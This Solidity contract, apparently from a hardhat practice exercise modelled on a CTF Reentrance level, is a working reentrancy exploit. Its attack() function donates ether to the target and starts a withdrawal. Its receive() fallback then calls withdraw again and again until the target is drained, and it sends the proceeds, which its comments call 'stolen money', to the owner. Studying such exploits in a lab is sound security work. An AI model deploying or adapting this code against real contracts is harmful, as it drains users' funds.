// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "./Reentrance.sol";
import "hardhat/console.sol";

contract Attack {
    Reentrance public reentranceContract;
    address public owner;

    constructor(address payable _reentranceContract) public {
        reentranceContract = Reentrance(_reentranceContract);
        owner = msg.sender;
    }

    function attack() public payable {
        reentranceContract.donate{value: msg.value}(address(this));
        reentranceContract.withdraw(1e14);
    }

    receive() external payable {
        console.log("performing reenrancy attack");
        if (address(reentranceContract).balance > 0) {
            console.log(
                "The balance is now %s",
                address(reentranceContract).balance
            );
            reentranceContract.withdraw(1e14);
        }

        uint currentBalance = address(this).balance;
        // This was made to successfuly reclaim our stolen eth
        (bool success, ) = owner.call{value: address(this).balance}(""); // transfers stolen money to the owner of the contract

        if (success) {
            console.log("Successfully sent %s to %s", currentBalance, owner);
        }
    }
}
